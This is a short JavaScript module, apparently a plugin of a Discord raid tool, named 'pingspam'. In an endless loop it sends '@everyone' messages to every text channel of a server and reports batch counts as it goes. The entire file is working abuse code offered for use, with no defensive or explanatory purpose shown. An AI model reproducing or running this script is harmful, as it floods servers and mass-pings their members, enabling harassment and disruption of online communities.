export default {
    id: "pingspam",
    description: "Spams every text channel in the guild with @everyone pings",
    async* exec(guild) {
        const content = {
            content: "@everyone",
            allowedMentions: {
                everyone: true
            }
        }

        yield [1, "Sending messages..."]

        let i = 0
        let total = 0
        for (;;) {
            const channels = (await guild.getRESTChannels())
                .filter(channel => channel.type === 0)

            await Promise.all(
                channels.map(channel =>
                    channel.createMessage(content).catch(console.error)
                )
            )

            yield [1, `Sent message batch ${++i} (${total += channels.length} messages total)`]
        }
    }
}